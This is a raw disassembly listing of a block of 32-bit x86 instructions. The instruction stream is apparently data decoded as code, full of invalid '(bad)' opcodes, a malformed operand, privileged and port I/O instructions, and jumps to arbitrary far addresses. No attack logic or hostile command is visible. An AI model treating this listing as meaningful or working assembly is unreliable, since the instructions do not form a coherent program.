  406ae9:	cmp    BYTE PTR [ebx+0x2505742f],dl
  406aef:	mov    ah,0xac
  406af1:	je     0x406ad4
  406af3:	test   esi,0x856343ed
  406af9:	lahf   
  406afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406afb:	lods   al,BYTE PTR ds:[esi]
  406afc:	jo     0x406af5
  406afe:	pop    es
  406aff:	adc    al,0x36
  406b01:	fsubr  QWORD PTR [eax]
  406b03:	xor    eax,0x84c3f9d3
  406b08:	loop   0x406b4c
  406b0a:	pop    ds
  406b0b:	stos   BYTE PTR es:[edi],al
  406b0c:	ja     0x406aa8
  406b0e:	mov    al,0xf5
  406b10:	loopne 0x406b34
  406b12:	rcr    DWORD PTR [ecx],0x2f
  406b15:	mov    edi,ebx
  406b17:	sbb    ecx,eax
  406b19:	pop    ebp
  406b1a:	outs   dx,DWORD PTR ds:[esi]
  406b1b:	aad    0x59
  406b1d:	or     DWORD PTR ss:[edx-0x61d5d005],esi
  406b24:	imul   esp,DWORD PTR [edi-0x6f4423e0],0xffffff95
  406b2b:	imul   esp,DWORD PTR [ebx],0x6d
  406b2e:	mov    ebp,0xba9f0146
  406b33:	ror    BYTE PTR [edx+0x5ae795df],0xff
  406b3a:	add    al,0x25
  406b3c:	jg     0x406b65
  406b3e:	jmp    0x7cffd260
  406b43:	psubb  mm4,mm5
  406b46:	in     eax,dx
  406b47:	mov    ecx,0x8362f4b5
  406b4c:	sbb    eax,0x9b9dd574
  406b51:	adc    cl,BYTE PTR [ebx]
  406b53:	push   cs
  406b54:	cmp    bh,cl
  406b56:	push   0x41
  406b58:	ins    BYTE PTR es:[edi],dx
  406b59:	repz push esi
  406b5b:	xchg   ebx,eax
  406b5c:	pop    ds
  406b5d:	mov    al,ds:0xd3a4d925
  406b62:	dec    ebp
  406b63:	pop    ebx
  406b64:	jb     0x406bae
  406b66:	push   0x4b
  406b68:	mov    cl,0xe
  406b6a:	test   DWORD PTR [esi+0x148d2e48],ecx
  406b70:	clc    
  406b71:	or     BYTE PTR [edx-0x21fb4e1f],cl
  406b77:	pusha  
  406b78:	add    BYTE PTR [ecx-0x59],dh
  406b7b:	mov    ebp,0xd6bb4bb4
  406b80:	int    0x14
  406b82:	jae    0x406b81
  406b84:	ja     0x406c01
  406b86:	dec    ecx
  406b87:	loope  0x406b6c
  406b89:	aam    0x8d
  406b8b:	mov    al,ds:0x10a0e51e
  406b90:	out    dx,eax
  406b91:	popf   
  406b92:	scas   eax,DWORD PTR es:[edi]
  406b93:	iret   
  406b94:	xchg   ebx,eax
  406b95:	sar    cl,1
  406b97:	ficom  WORD PTR [ecx-0x7d966a8f]
  406b9d:	push   esi
  406b9e:	dec    ecx
  406b9f:	ins    BYTE PTR es:[edi],dx
  406ba0:	sbb    BYTE PTR ds:0x929d6659,cl
  406ba6:	sub    al,0x23
  406ba8:	add    BYTE PTR [edx],0xa0
  406bab:	jns    0x406b6c
  406bad:	hlt    
  406bae:	je     0x406ba3
  406bb0:	int    0xba
  406bb2:	add    bh,BYTE PTR [edx]
  406bb4:	pop    edx
  406bb5:	(bad)  
  406bb6:	pop    ss
  406bb7:	fs pushf 
  406bb9:	call   edx
  406bbb:	cmc    
  406bbc:	mov    edi,0xa57079c5
  406bc1:	inc    esp
  406bc2:	mov    ecx,0x563af9ab
  406bc7:	and    ch,BYTE PTR [eax+0xdc0db1b]
  406bcd:	in     al,0x3b
  406bcf:	inc    ecx
  406bd0:	sahf   
  406bd1:	les    ecx,FWORD PTR [ecx+0x9]
  406bd4:	sub    BYTE PTR [ebx+esi*2-0x5],al
  406bd8:	push   0xf1b5dff1
  406bdd:	into   
  406bde:	neg    ch
  406be0:	pop    ebx
  406be1:	repnz xor BYTE PTR [edi+ebx*8+0x27],ch
  406be6:	cwde   
  406be7:	cmp    ebp,DWORD PTR es:[eax-0x21]
  406beb:	mov    ds:0x4c400071,eax
  406bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bf1:	int3   
  406bf2:	pushf  
  406bf3:	push   ss
  406bf4:	aas    
  406bf5:	mov    ah,0xa1
  406bf7:	xchg   esp,ebp
  406bf9:	out    dx,eax
  406bfa:	mov    dh,0x8
  406bfc:	sahf   
  406bfd:	mov    edx,0xdf5f3f9f
  406c02:	and    dh,ah
  406c04:	mov    al,0x6f
  406c06:	mov    ebp,cr2
  406c09:	nop
  406c0a:	or     al,0x91
  406c0c:	jb     0x406bbc
  406c0e:	mov    WORD PTR [ebx],es
  406c10:	in     al,0x95
  406c12:	add    ebx,edx
  406c14:	push   ds
  406c15:	mov    bl,0x5b
  406c17:	ss pop es
  406c19:	xchg   BYTE PTR [esi],cl
  406c1b:	scas   al,BYTE PTR es:[edi]
  406c1c:	es sub dl,0xbf
  406c20:	shl    BYTE PTR [ecx],0x3c
  406c23:	adc    DWORD PTR [esi-0x764b06bf],ebp
  406c29:	imul   ebp,DWORD PTR [ecx],0x2a
  406c2c:	and    al,0x89
  406c2e:	inc    DWORD PTR [ebp+0x79e4d702]
  406c34:	shl    BYTE PTR [edx],1
  406c36:	aad    0x25
  406c38:	add    dh,bh
  406c3a:	and    al,0x4d
  406c3c:	lahf   
  406c3d:	imul   ebp,DWORD PTR [esp+ebp*4-0x4afdf2f1],0x2
  406c45:	mov    al,ds:0x92139609
  406c4a:	dec    edi
  406c4b:	jno    0x406c0b
  406c4d:	in     al,dx
  406c4e:	jmp    0xf510496c
  406c53:	jmp    0x406c50
  406c55:	pushf  
  406c56:	nop
  406c57:	popa   
  406c58:	adc    ebx,DWORD PTR [edx]
  406c5a:	dec    ebp
  406c5b:	xchg   eax,esi
  406c5d:	cli    
  406c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5f:	fucomi st,st(5)
  406c61:	test   BYTE PTR ds:0x21135da3,0x85
  406c68:	fsub   QWORD PTR [ebx-0x23661880]
  406c6e:	fild   WORD PTR [eax]
  406c70:	mov    dh,BYTE PTR [ebx-0x1c206980]
  406c76:	pop    esp
  406c77:	test   cl,ch
  406c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c7a:	(bad)  
  406c7b:	iret   
  406c7c:	or     eax,0xf8bf8d69
  406c81:	outs   dx,BYTE PTR gs:[esi]
  406c83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c84:	jnp    0x406c88
  406c86:	jge    0x406c47
  406c88:	gs push edx
  406c8a:	jecxz  0x406c3a
  406c8c:	fmulp  st(3),st
  406c8e:	data16 lods al,BYTE PTR ds:[esi]
  406c90:	mov    al,0xd6
  406c92:	sbb    edx,DWORD PTR [ebx+0x31]
  406c95:	mov    bh,0xc1
  406c97:	test   DWORD PTR ds:0x59b11ab7,edx
  406c9d:	pop    edx
  406c9e:	ins    DWORD PTR es:[edi],dx
  406c9f:	fsub   st,st(6)
  406ca1:	sti    
  406ca2:	rcr    DWORD PTR [ebx+0x1d],0x1d
  406ca6:	xor    esp,DWORD PTR ds:0x3a5e9619
  406cac:	push   ss
  406cad:	dec    ebp
  406cae:	or     al,0x52
  406cb0:	(bad)  [ebx+0x2d]
  406cb3:	xor    al,0xe7
  406cb5:	fsub   DWORD PTR [ecx+ebx*1+0x6e4c396e]
  406cbc:	cwde   
  406cbd:	test   ebp,0xf6d7c775
  406cc3:	and    al,ch
  406cc5:	shl    ecx,1
  406cc7:	mov    bh,0x55
  406cc9:	fiadd  WORD PTR [ebp-0x3d759400]
  406ccf:	ds adc dl,bh
  406cd2:	dec    edi
  406cd3:	xor    eax,0x7b4eacfe
  406cd8:	popf   
  406cd9:	aam    0xb
  406cdb:	mov    ds:0x97847c82,al
  406ce0:	test   eax,0xe36af56c
  406ce5:	xor    al,0x66
  406ce7:	and    bh,dl
  406ce9:	sub    BYTE PTR [ecx-0x6c],0xc4
  406ced:	adc    BYTE PTR [ebx-0x65b5506c],0x57
  406cf4:	sub    edx,DWORD PTR [ecx+0x28]
  406cf7:	popa   
  406cf8:	mov    gs,WORD PTR [ebp+0x444d517e]
  406cfe:	push   0xe8cca1f7
  406d03:	psrlq  mm3,QWORD PTR [ebx]
  406d06:	dec    eax
  406d07:	inc    eax
  406d08:	and    bl,cl
  406d0a:	or     ebp,0x400a7f30
  406d10:	sub    bl,BYTE PTR [edx-0x4019c46f]
  406d16:	push   ss
  406d17:	in     al,0xb1
  406d19:	enter  0xed5f,0xe6
  406d1d:	fild   DWORD PTR [ebx-0x7b]
  406d20:	(bad)  
  406d21:	lock stc 
  406d23:	je     0x406d0e
  406d25:	test   al,0x55
  406d27:	lods   al,BYTE PTR ds:[esi]
  406d28:	jge    0x406d02
  406d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d2b:	mov    ch,0x17
  406d2d:	loope  0x406d04
  406d2f:	cs inc ebx
  406d31:	jmp    0xa38a:0x7a391eaf
  406d38:	arpl   ax,cx
  406d3a:	jecxz  0x406cd7
  406d3c:	fsub   QWORD PTR [ecx]
  406d3e:	add    ebx,DWORD PTR [ecx-0x7b2fd392]
  406d44:	xchg   esp,eax
  406d45:	jne    0x406d98
  406d47:	sbb    BYTE PTR [ebx+0x3ef524fe],ch
  406d4d:	mov    edx,0x48ebe5eb
  406d52:	jp     0x406dc9
  406d54:	or     BYTE PTR [esi+0x6ab61909],0x37
  406d5b:	jmp    0x2e05:0xbc7d2cb6
  406d62:	iret   
  406d63:	fdiv   st(3),st
  406d65:	ss sub eax,0x64ed8dbb
  406d6b:	fsubr  st(4),st
  406d6d:	sub    eax,0xf4094c7b
  406d72:	pop    ss
  406d73:	nop
  406d74:	cmp    al,0x60
  406d76:	jo     0x406d94
  406d78:	aas    
  406d79:	div    DWORD PTR [eax]
  406d7b:	or     al,bl
  406d7d:	fwait
  406d7e:	aaa    
  406d7f:	xchg   ecx,eax
  406d80:	jmp    0x5239b0cf
  406d85:	leave  
  406d86:	jmp    0xdf33:0x4806bc69
  406d8d:	sbb    edx,ebp
  406d8f:	push   edi
  406d90:	sub    eax,0xbf4f15aa
  406d95:	addr16 data16 mov ch,0x93
  406d99:	les    eax,FWORD PTR [ecx]
  406d9b:	push   esi
  406d9c:	js     0x406d82
  406d9e:	cmp    BYTE PTR [eax+ebx*2-0x4],bh
  406da2:	dec    ebx
  406da3:	fs int3 
  406da5:	mov    esi,0xde906bdd
  406daa:	cmp    dl,BYTE PTR [edx]
  406dac:	jno    0x406dec
  406dae:	xor    DWORD PTR [esi-0x51440cc9],ecx
  406db4:	jno    0x406dd5
  406db6:	xchg   BYTE PTR [edx+0x4f65b4bd],bh
  406dbc:	icebp  
  406dbd:	adc    ah,bl
  406dbf:	mov    ds:0x54aab135,eax
  406dc4:	nop
  406dc5:	xchg   edi,eax
  406dc6:	cmp    DWORD PTR ds:0x34b1dff7,eax
  406dcc:	out    dx,eax
  406dcd:	push   0xbcb1f4be
  406dd2:	sar    DWORD PTR [edx],1
  406dd4:	push   edi
  406dd5:	inc    esp
  406dd6:	jnp    0x406da4
  406dd8:	enter  0x427f,0xba
  406ddc:	fild   WORD PTR [ebp+0x73c88f4f]
  406de2:	mov    dh,0xc0
  406de4:	mov    ah,0x54
  406de6:	jne    0x406e63
  406de8:	push   edi
  406de9:	fnstcw WORD PTR [ecx]
  406deb:	xor    DWORD PTR [ecx+ecx*2],ecx
  406dee:	stos   BYTE PTR es:[edi],al
  406def:	ins    DWORD PTR es:[edi],dx
  406df0:	sub    eax,ebp
  406df2:	add    BYTE PTR [esi+eax*1-0x52],ch
  406df6:	(bad)  
  406df7:	test   al,0x11
  406df9:	xchg   edi,eax
  406dfa:	cs retf 
  406dfc:	jo     0x406e04
  406dfe:	pop    esp
  406dff:	bound  eax,QWORD PTR [eax]
  406e01:	ss mov edx,0xa9096fe1
  406e07:	dec    esp
  406e08:	pop    esi
  406e09:	clc    
  406e0a:	hlt    
  406e0b:	in     eax,0xb4
  406e0d:	test   DWORD PTR [esi],esi
  406e0f:	(bad)  
  406e10:	inc    eax
  406e11:	sar    BYTE PTR [ebx],cl
  406e13:	mov    ds:0xf56a7188,eax
  406e18:	pop    esi
  406e19:	mov    ch,0xf
  406e1b:	sti    
  406e1c:	mov    BYTE PTR [ebx-0x1a],ah
  406e1f:	xchg   ecx,eax
  406e20:	sahf   
  406e21:	cli    
  406e22:	add    edx,DWORD PTR [ecx+0x1891c564]
  406e28:	push   ecx
  406e29:	sbb    DWORD PTR [ecx+0x35140c79],0xd1ffa121
  406e33:	inc    ecx
  406e34:	dec    esp
  406e35:	jb     0x406e13
  406e37:	push   cs
  406e38:	mov    esi,0xb72e1df0
  406e3d:	pop    es
  406e3e:	push   cs
  406e3f:	push   di
  406e41:	jne    0x406e1f
  406e43:	mov    esp,0x8505fa5d
  406e48:	sub    DWORD PTR [eax-0x1a],0xe659a5bb
  406e4f:	cmp    al,0xf9
  406e51:	stc    
  406e52:	and    edi,0x68
  406e55:	jnp    0x406e7c
  406e57:	dec    ecx
  406e58:	es jae 0x406eae
  406e5b:	pop    eax
  406e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e5d:	xor    DWORD PTR [esi-0x6f],eax
  406e60:	jae    0x406eda
  406e62:	lods   eax,DWORD PTR ds:[esi]
  406e63:	pop    ss
  406e64:	sti    
  406e65:	pusha  
  406e66:	mov    dh,0x7a
  406e68:	mov    ecx,0x365f1dd7
  406e6d:	xor    DWORD PTR [esi+ebx*8],edi
  406e70:	jno    0x406e4e
  406e72:	cmc    
  406e73:	add    BYTE PTR [ebp-0x5e],dl
  406e76:	push   ebp
  406e77:	cmp    eax,DWORD PTR [edi-0x76]
  406e7a:	add    esp,esi
  406e7c:	into   
  406e7d:	scas   eax,DWORD PTR es:[edi]
  406e7e:	stos   DWORD PTR es:[edi],eax
  406e7f:	sbb    DWORD PTR [ecx-0x72],ecx
  406e82:	or     al,0x36
  406e84:	ins    DWORD PTR es:[edi],dx
  406e85:	pop    ebp
  406e86:	pop    edi
  406e87:	ss arpl dx,cx
  406e8a:	push   edi
  406e8b:	add    BYTE PTR [eax+eiz*2-0x5e],al
  406e8f:	fdivr  QWORD PTR ds:0x426bd795
  406e95:	icebp  
  406e96:	in     eax,0x77
  406e98:	inc    edi
  406e99:	inc    ebp
  406e9a:	test   al,0xd3
  406e9c:	(bad)  [edi+ebp*1+0x4f45f7df]
  406ea3:	iret   
  406ea4:	push   0xffffff8c
  406ea6:	or     al,0x3
  406ea8:	and    edi,DWORD PTR [ebp-0x5a]
  406eab:	and    BYTE PTR ds:0xfff56568,0x91
  406eb2:	xor    eax,0x15e3d5fa
  406eb7:	or     BYTE PTR [eax+0x7c],bl
  406eba:	or     BYTE PTR [ebx+0x57],dl
  406ebd:	cld    
  406ebe:	xlat   BYTE PTR ds:[ebx]
  406ebf:	push   ecx
  406ec0:	jno    0x406f20
  406ec2:	or     eax,0xcb291115
  406ec7:	sar    DWORD PTR [esi+edi*4+0x2],1
  406ecb:	int    0xe
  406ecd:	(bad)  
  406ece:	dec    ebx
  406ecf:	imul   eax,eax,0x584aa0d2
  406ed5:	xchg   DWORD PTR [esi-0x3f900442],ecx
  406edb:	xor    eax,0xe0e38731
  406ee0:	xchg   DWORD PTR [edi+0x28],eax
  406ee3:	loopne 0x406ea1
  406ee5:	adc    dh,BYTE PTR [esi-0x4]
  406ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee9:	and    ecx,DWORD PTR [edi+0x53878fe0]
  406eef:	add    eax,0xf8047d01
  406ef4:	sbb    al,0x73
  406ef6:	(bad)  
  406ef8:	scas   eax,DWORD PTR es:[edi]
  406ef9:	adc    al,0xe0
  406efb:	sbb    ebx,ebx
  406efd:	arpl   WORD PTR [esi+0x2b3373c0],sp
  406f03:	push   eax
  406f04:	shr    edi,cl
  406f06:	fld    st(3)
  406f08:	cmp    ebx,DWORD PTR [edi+0x71]
  406f0b:	mov    eax,0x9713e500
  406f10:	lea    eax,[esi]
  406f12:	retf   0x78e
  406f15:	dec    esi
  406f16:	jge    0x406f85
  406f18:	mov    ds:0x106a9532,eax
  406f1d:	jb     0x406eda
  406f1f:	sbb    ah,BYTE PTR [ebx]
  406f21:	in     eax,0x1a
  406f23:	scas   eax,DWORD PTR es:[edi]
  406f24:	lea    edi,[esi+eiz*4+0x4f]
  406f28:	icebp  
  406f29:	jne    0x406f6e
  406f2b:	xchg   ebp,eax
  406f2c:	inc    esi
  406f2d:	sbb    BYTE PTR [bp-0x31],0xc
  406f32:	push   eax
  406f33:	lahf   
  406f34:	mov    bh,cl
  406f36:	imul   ecx,DWORD PTR [edx],0x3202c4d2
  406f3c:	icebp  
  406f3d:	add    BYTE PTR [edx],ch
  406f3f:	fadd   QWORD PTR [eax+0x53]
  406f42:	scas   eax,DWORD PTR es:[edi]
  406f43:	or     bl,ah
  406f45:	fucom  st(5)
  406f47:	les    ebx,FWORD PTR [eax+0x2ac57615]
  406f4d:	aaa    
  406f4e:	(bad)  
  406f4f:	cli    
  406f50:	shl    edi,0x89
  406f53:	aad    0x60
  406f55:	and    DWORD PTR [edi-0x5cb81411],ebp
  406f5b:	inc    esp
  406f5c:	ds retf 0xff29
  406f60:	adc    cl,ch
  406f62:	xor    eax,0x33dfd241
  406f67:	repnz xor DWORD PTR [eax-0x77e935ae],0x9264d0fb
  406f72:	ret    
  406f73:	loop   0x406f3b
  406f75:	inc    eax
  406f76:	das    
  406f77:	in     eax,0xa3
  406f79:	fist   WORD PTR [edi]
  406f7b:	fwait
  406f7c:	and    al,BYTE PTR [edx]
  406f7e:	shl    DWORD PTR [edi],0xb3
  406f81:	cld    
  406f82:	and    ebp,DWORD PTR [ebx]
  406f84:	out    0x16,al
  406f86:	pop    esi
  406f87:	shl    DWORD PTR [ecx],cl
  406f89:	sbb    ecx,0xaab59512
  406f8f:	adc    bh,dh
  406f91:	push   ebx
  406f92:	in     al,0x1f
  406f94:	push   0xdcb9509d
  406f99:	test   BYTE PTR [ebx+0x4f],dh
  406f9c:	cli    
  406f9d:	sti    
  406f9e:	dec    edi
  406f9f:	mov    eax,ds:0xb52111ab
  406fa4:	push   esi
  406fa5:	shl    cl,cl
  406fa7:	shr    BYTE PTR [esi],0xc5
  406faa:	xchg   ebx,eax
  406fab:	mov    ah,0x6e
  406fad:	adc    eax,0xe76755b5
  406fb2:	jae    0x406fec
  406fb4:	fst    QWORD PTR [ebx+0x59e645a5]
  406fba:	sbb    ebx,0x2d
  406fbd:	(bad)  [ebp+0x58d2f343]
  406fc3:	shr    BYTE PTR [edx],cl
  406fc5:	add    al,0xc5
  406fc7:	scas   eax,DWORD PTR es:[edi]
  406fc8:	pop    esi
  406fc9:	pop    ecx
  406fca:	mov    al,ds:0x806d91bd
  406fcf:	mov    ebx,0x9d486b4b
  406fd4:	push   ebx
  406fd5:	cmp    eax,0xfd534cc3
  406fda:	or     DWORD PTR [esi+eiz*4],0xffffffcb
  406fde:	ror    BYTE PTR [ebx-0x20],cl
  406fe1:	or     BYTE PTR ds:0xdd7bcce,0x23
  406fe8:	adc    DWORD PTR [esi+0xefefa26],0x70
  406fef:	jge    0x40705d
  406ff1:	imul   edi,DWORD PTR [ebp+edx*8-0x2],0x18
  406ff6:	jns    0x406f95
  406ff8:	jb     0x40702e
  406ffa:	gs mov bl,0xe7
  406ffd:	lds    eax,FWORD PTR [ecx+ecx*8+0x1d]
  407001:	aad    0x49
  407003:	jns    0x407026
  407005:	clc    
  407006:	lods   eax,DWORD PTR ds:[esi]
  407007:	(bad)  
  407008:	sub    edi,DWORD PTR es:[edi]
  40700b:	ss mov bh,0x71
  40700e:	repnz inc esp
  407010:	pop    ebx
  407011:	add    al,0x24
  407013:	jmp    0xe026:0xff01c88a
  40701a:	or     BYTE PTR [eax+eax*4],bl
  40701d:	popf   
  40701e:	sti    
  40701f:	add    DWORD PTR [eax+0x6fe5eda6],ecx
  407025:	call   0xf9e0:0x4687fd49
  40702c:	aad    0xc3
  40702e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40702f:	jmp    0x6d7:0xcf1b754b
  407036:	xchg   edi,eax
  407037:	pop    ss
  407038:	mov    ah,0x94
  40703a:	jns    0x4070a2
  40703c:	mov    BYTE PTR [edi-0x229d5078],al
  407042:	xchg   ebx,eax
  407043:	cmp    DWORD PTR ds:0x4d6929a9,ebx
  407049:	xchg   ecx,eax
  40704a:	push   0x15
  40704c:	cmp    DWORD PTR [edx-0x25],ecx
  40704f:	jecxz  0x407060
  407051:	dec    edi
  407052:	gs or  DWORD PTR ss:[ebp-0x15],eax
  407057:	enter  0x114b,0xc1
  40705b:	or     DWORD PTR [edi+0x7ef8847],esi
  407061:	fcom   QWORD PTR [ebp+0x30159507]
  407067:	cmp    DWORD PTR [esp+ecx*2],eax
  40706a:	cmp    BYTE PTR [ebp+0x2b],dh
  40706d:	shl    DWORD PTR [esi],0x80
  407070:	sahf   
  407071:	pop    es
  407072:	cmp    al,0x20
  407074:	inc    ecx
  407075:	adc    eax,0xf5ab5c84
  40707a:	jmp    0x407079
  40707c:	pop    ecx
  40707d:	jmp    0x407080
  40707f:	dec    BYTE PTR [ebx+ebp*8]
  407082:	pop    es
  407083:	jl     0x407059
  407085:	stos   BYTE PTR es:[edi],al
  407086:	aad    0xc9
  407088:	push   ss
  407089:	lahf   
  40708a:	jmp    0xdeb10579
  40708f:	lods   al,BYTE PTR ds:[esi]
  407090:	das    
  407091:	mov    ebx,0x6beb9c0b
  407096:	shl    BYTE PTR es:[ebx+0x1e],0x55
  40709b:	mov    ah,0xd8
  40709d:	lea    ebx,[ecx]
  40709f:	outs   dx,DWORD PTR ds:[esi]
  4070a0:	leave  
  4070a1:	jne    0x407112
  4070a3:	std    
  4070a4:	ja     0x407104
  4070a6:	aam    0x98
  4070a8:	(bad)  
  4070a9:	hlt    
  4070aa:	sti    
  4070ab:	sbb    al,dl
  4070ad:	das    
  4070ae:	xchg   ebx,eax
  4070af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b0:	icebp  
  4070b1:	lock inc eax
  4070b3:	cmp    eax,0x5f526512
  4070b8:	pop    ebp
  4070b9:	fidivr DWORD PTR [ebx+0xea0e674]
  4070bf:	xchg   BYTE PTR [ecx],cl
  4070c1:	mov    ecx,0xde36db8a
  4070c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070c7:	mov    esi,0x6bbc74de
  4070cc:	pop    edi
  4070cd:	push   ebp
  4070ce:	mov    DWORD PTR [edi+0x5],esi
  4070d1:	sub    eax,0xc253a11b
  4070d6:	xchg   edi,eax
  4070d7:	das    
  4070d8:	mov    esi,0x3f4c43e1
  4070dd:	dec    ebp
  4070de:	push   0xffffff86
  4070e0:	sub    eax,0x833fda21
  4070e5:	out    dx,al
  4070e6:	retf   0x9f4d
  4070e9:	in     eax,0x9b
  4070eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070ec:	jg     0x4070c4
  4070ee:	adc    ecx,edx
  4070f0:	dec    esi
  4070f1:	cwde   
  4070f2:	imul   esi,eax,0x1e731df4
  4070f8:	xchg   edi,eax
  4070f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070fa:	mov    dh,0xa5
  4070fc:	jp     0x407165
  4070fe:	in     al,dx
  4070ff:	mov    al,ds:0xcb5d8ea0
  407104:	std    
  407105:	scas   eax,DWORD PTR es:[edi]
  407106:	lock mov eax,0x3a3a1e34
  40710c:	pop    ebp
  40710d:	imul   ebp
  40710f:	pop    ds
  407110:	loope  0x40712a
  407112:	pop    ecx
  407113:	dec    edx
  407114:	pop    eax
  407115:	jle    0x4070bf
  407117:	pop    ss
  407118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407119:	push   0x512f13a7
  40711e:	out    0x72,eax
  407120:	daa    
  407121:	xchg   ebx,eax
  407122:	cmp    al,0x99
  407124:	mov    ?,WORD PTR [edi-0x3df5a71f]
  40712a:	mov    ah,0x1e
  40712c:	gs dec ebp
  40712e:	ss mov esi,0x6cd76d7a
  407134:	clc    
  407135:	xchg   edi,eax
  407136:	fist   WORD PTR [ebp+0x8]
  407139:	push   cs
  40713a:	or     al,0xf1
  40713c:	and    bh,BYTE PTR [ebx-0x3e9180bf]
  407142:	add    eax,0xbe04d218
  407147:	mov    bh,0xf6
  407149:	int3   
  40714a:	ss (bad) 
  40714c:	xchg   edx,eax
  40714d:	mov    cl,ch
  40714f:	pusha  
  407150:	inc    edx
  407151:	out    0xe6,al
  407153:	mov    ah,0x84
  407155:	add    eax,0xe8246199
  40715a:	xchg   ebp,eax
  40715b:	inc    edx
  40715c:	jb     0x40713d
  40715e:	mov    ecx,0x2a34ad43
  407163:	add    al,0xf0
  407165:	sub    BYTE PTR [ecx+0x79fb7853],bl
  40716b:	add    eax,0xb04502fb
  407170:	and    BYTE PTR [ecx],dh
  407172:	addr16 dec ebp
  407174:	jno    0x407154
  407176:	mov    ds:0x32bb47c8,al
  40717b:	out    dx,al
  40717c:	pop    edi
  40717d:	(bad)  
  40717e:	aad    0x3a
  407180:	clc    
  407181:	or     BYTE PTR [edx+0x67],al
  407184:	add    DWORD PTR [ebx],eax
  407186:	xchg   edx,eax
  407187:	xchg   ebx,eax
  407188:	fnstenv [esi+0x63]
  40718b:	fdiv   st(1),st
  40718d:	rcr    BYTE PTR [esi-0x1d00ecb6],1
  407193:	out    dx,eax
  407194:	push   0x81998448
  407199:	fsubrp st(5),st
  40719b:	loop   0x407138
  40719d:	fs test al,0x36
  4071a0:	push   ecx
  4071a1:	ret    0xf7c0
  4071a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a5:	adc    DWORD PTR [ebp-0x683b3b07],esp
  4071ab:	imul   eax,DWORD PTR [ecx-0x695dd3c8],0x4a8476ce
  4071b5:	fdiv   DWORD PTR [esi]
  4071b7:	test   edx,ecx
  4071b9:	push   esi
  4071ba:	sbb    ecx,DWORD PTR [esi+0x50]
  4071bd:	sbb    dl,ah
  4071bf:	mov    edi,0x37a7adf5
  4071c4:	aad    0xa6
  4071c6:	inc    ecx
  4071c7:	lods   al,BYTE PTR ds:[esi]
  4071c8:	hlt    
  4071c9:	mov    bh,0x8a
  4071cb:	mov    edi,0x2c922bf5
  4071d0:	jmp    0xc3b5:0x4fc3a913
  4071d7:	and    BYTE PTR [ebx+0x42],dh
  4071da:	add    eax,0xca19f440
  4071df:	mov    ecx,0x606799b2
  4071e4:	gs test dh,ah
  4071e7:	add    al,0xda
  4071e9:	call   0x2e74:0x51bf912d
  4071f0:	fwait
  4071f1:	inc    eax
  4071f2:	sbb    cl,BYTE PTR [ecx-0x730e25ab]
  4071f8:	xchg   esi,eax
  4071f9:	inc    edi
  4071fa:	ds fs push cs
  4071fd:	jmp    0x894e:0x5d059320
  407204:	rcl    DWORD PTR [esi],cl
  407206:	jbe    0x4071eb
  407208:	adc    ah,BYTE PTR [eax+0x3c]
  40720b:	and    eax,0x4137bf4c
  407210:	lock fdiv st(2),st
  407213:	push   es
  407214:	mov    ds:0xe8b94511,eax
  407219:	mov    cl,0x83
  40721b:	std    
  40721c:	fadd   DWORD PTR [ebx]
  40721e:	je     0x407230
  407220:	fild   WORD PTR [ebp+edx*4+0x2d]
  407224:	inc    edx
  407225:	mov    ds:0xbaf2f0fb,eax
  40722a:	es icebp 
  40722c:	push   ss
  40722d:	mov    ds:0x1fddcfc1,al
  407232:	xchg   ebx,eax
  407233:	pop    edx
  407234:	push   ebp
  407235:	xchg   DWORD PTR [esi+0x22],esp
  407238:	lea    esp,[eax]
  40723a:	es test al,0xe2
  40723d:	or     al,0xab
  40723f:	and    BYTE PTR [edx+0xf3ac7d0],0x66
  407246:	push   eax
  407247:	fsub   QWORD PTR [eax+edi*2-0x6e561846]
  40724e:	dec    esp
  40724f:	push   edi
  407250:	imul   ebp,DWORD PTR [esi+ebp*1-0x5],0xffffffe3
  407255:	mov    al,ds:0xa3583331
  40725a:	mov    esi,0x44937715
  40725f:	aaa    
  407260:	adc    BYTE PTR [edi+edi*2],ah
  407263:	mov    ds:0x4f6382aa,al
  407268:	jmp    0xb010e2ed
  40726d:	inc    ecx
  40726e:	xor    BYTE PTR [ebp-0x38],bh
  407271:	aad    0xaa
  407273:	xlat   BYTE PTR ds:[ebx]
  407274:	stos   BYTE PTR es:[edi],al
  407275:	test   DWORD PTR [edi],0xa8c350fd
  40727b:	xchg   edx,eax
  40727c:	dec    edi
  40727d:	mov    cl,0x17
  40727f:	scas   al,BYTE PTR es:[edi]
  407280:	addr16 repnz aad 0x0
  407284:	and    BYTE PTR [ebx+0x6e],dl
  407287:	imul   ecx,DWORD PTR [ebx],0x13
  40728a:	lea    eax,[esp+edx*8-0x40]
  40728e:	popa   
  40728f:	inc    edi
  407290:	dec    edi
  407291:	pop    edx
  407292:	js     0x40721a
  407294:	xchg   esp,eax
  407295:	dec    ebx
  407296:	sbb    BYTE PTR ds:0x7ee5edd5,cl
  40729c:	or     eax,0x892dd3d
  4072a1:	sub    BYTE PTR [edx-0x1],ch
  4072a4:	sbb    ebx,DWORD PTR [edx]
  4072a6:	into   
  4072a7:	std    
  4072a8:	sbb    al,0x15
  4072aa:	inc    edi
  4072ab:	push   edx
  4072ac:	sahf   
  4072ad:	sbb    al,0x99
  4072af:	and    cl,BYTE PTR [edi+0x56]
  4072b2:	mov    ebx,0x2c658776
  4072b7:	ss mov esp,0xa1721687
  4072bd:	mov    ds:0x87504687,al
  4072c2:	jmp    0x407278
  4072c4:	sbb    al,0x7d
  4072c6:	or     BYTE PTR [edx+0x58c6ee45],al
  4072cc:	and    al,bh
  4072ce:	(bad)  
  4072cf:	test   BYTE PTR [eax+0x7],0x57
  4072d3:	xor    ah,dl
  4072d5:	retf   
